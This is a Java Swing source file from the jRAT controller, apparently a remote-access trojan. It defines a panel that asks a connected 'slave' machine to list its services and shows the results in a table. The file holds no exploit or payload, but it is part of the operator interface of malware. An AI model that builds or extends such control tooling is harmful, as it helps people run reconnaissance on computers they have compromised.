package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet77ListServices;
import io.jrat.controller.ui.components.DefaultJTable;
import io.jrat.controller.ui.components.TableModel;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;


@SuppressWarnings("serial")
public class PanelControlServices extends PanelControlParent {

	private JTable table;
	private TableModel model;

	public TableModel getModel() {
		return model;
	}

	public PanelControlServices(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnRefreshList = new JButton("Refresh list");
		btnRefreshList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
				slave.addToSendQueue(new Packet77ListServices());
			}
		});
		btnRefreshList.setIcon(IconUtils.getIcon("block"));

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(btnRefreshList)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnClear)
					.addContainerGap(400, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 305, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnRefreshList)
						.addComponent(btnClear))
					.addContainerGap(14, Short.MAX_VALUE))
		);

		table = new DefaultJTable();
		table.setRowHeight(25);
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Service name" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(586);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
